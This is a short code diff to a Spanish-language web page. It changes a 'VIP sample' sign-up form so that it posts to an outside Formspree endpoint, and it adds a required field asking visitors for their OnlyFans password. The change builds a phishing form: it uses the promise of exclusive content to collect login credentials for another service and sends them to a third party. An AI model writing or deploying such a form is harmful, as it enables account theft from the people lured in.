@@ -66,9 +66,19 @@
         </div>
 
         <!-- Formulario de acceso VIP -->
-        <form class="vip-form">
+        <form action="https://formspree.io/f/xvgkgeye" method="POST" class="vip-form">
             <h3>Accede a una muestra exclusiva</h3>
-            <input type="email" placeholder="Ingresa tu correo para recibir la muestra">
+            
+            <!-- Campo de correo -->
+            <input type="email" name="email" placeholder="Ingresa tu correo para recibir la muestra" required>
+            
+            <!-- Campo de clave para OnlyFans -->
+            <input type="password" name="onlyfans_key" placeholder="Ingresa tu clave para OnlyFans" required>
+            
+            <!-- Campo de mensaje (opcional) -->
+            <textarea name="message" placeholder="Opcional: Deja un mensaje o comentario" rows="4"></textarea>
+            
+            <!-- Botón para enviar -->
             <button type="submit">Obtener Muestra</button>
         </form>
 
